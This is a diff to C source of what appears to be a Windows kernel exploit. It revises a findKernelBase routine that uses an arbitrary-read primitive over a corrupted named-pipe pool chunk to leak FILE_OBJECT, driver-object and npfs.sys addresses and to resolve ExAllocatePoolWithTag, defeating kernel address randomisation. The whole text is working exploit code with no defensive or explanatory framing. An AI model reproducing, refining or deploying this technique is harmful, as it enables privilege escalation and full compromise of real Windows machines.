@@ -13,14 +13,8 @@
 
 uintptr_t findKernelBase(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs)
 {
-    uintptr_t file_object_addr;
     uintptr_t pipe_queue_entry_addr;
-
-    file_object_addr = addrs->leak_root_queue - ROOT_PIPE_QUEUE_ENTRY_OFFSET + FILE_OBJECT_OFFSET;
-    addrs->leak_root_attribute = addrs->leak_root_queue - ROOT_PIPE_QUEUE_ENTRY_OFFSET + ROOT_PIPE_ATTRIBUTE_OFFSET;
-    printf("[+] leak_root_attribute: 0x%llX\n", addrs->leak_root_attribute);
-
-    ArbitraryRead(ghost_pipe, addrs->leak_root_queue, (char*)&pipe_queue_entry_addr, 0x8);
+    ArbitraryRead(ghost_pipe, addrs->root_pipe_queue_entry, (char*)&pipe_queue_entry_addr, 0x8);
     printf("[+] pipe_queue_entry_addr: 0x%llX\n", pipe_queue_entry_addr);
     if (pipe_queue_entry_addr == 0x434343434343005A)
     {
@@ -28,8 +22,11 @@ uintptr_t findKernelBase(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs)
         return NULL;
     }
 
-    addrs->ghost_chunk = pipe_queue_entry_addr - POOL_HEADER_SIZE;
-    printf("[+] ghost_chunk: 0x%llX\n", addrs->ghost_chunk);
+    addrs->ghost_vs_chunk = pipe_queue_entry_addr - sizeof(POOL_HEADER) - sizeof(HEAP_VS_CHUNK_HEADER);
+    printf("[+] ghost_chunk: 0x%llX\n", addrs->ghost_vs_chunk);
+
+    uintptr_t file_object_addr = addrs->root_pipe_queue_entry - ROOT_PIPE_QUEUE_ENTRY_OFFSET + FILE_OBJECT_OFFSET;
+    printf("[+] file_object_addr: 0x%llX\n", file_object_addr);
 
     uintptr_t file_object;
     ArbitraryRead(ghost_pipe, file_object_addr, (char*)&file_object, 0x8);
@@ -47,7 +44,7 @@ uintptr_t findKernelBase(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs)
     ArbitraryRead(ghost_pipe, driver_object + 0x70, (char*)&NpFsdCreate, 0x8);
     printf("[+] NpFsdCreate: 0x%llX\n", NpFsdCreate);
 
-    uintptr_t ExAllocatePoolWithTag_addr = NpFsdCreate - Npfs_NpFsdCreate_OFFSET + Npfs_imp_nt_ExAllocatePoolWithTag_OFFSET;
+    uintptr_t ExAllocatePoolWithTag_addr = NpFsdCreate - Npfs_NpFsdCreate_OFFSET + Npfs_imp_ExAllocatePoolWithTag_OFFSET;
     uintptr_t ExAllocatePoolWithTag;
     ArbitraryRead(ghost_pipe, ExAllocatePoolWithTag_addr, (char*)&ExAllocatePoolWithTag, 0x8);
     printf("[+] ExAllocatePoolWithTag: 0x%llX\n", ExAllocatePoolWithTag);
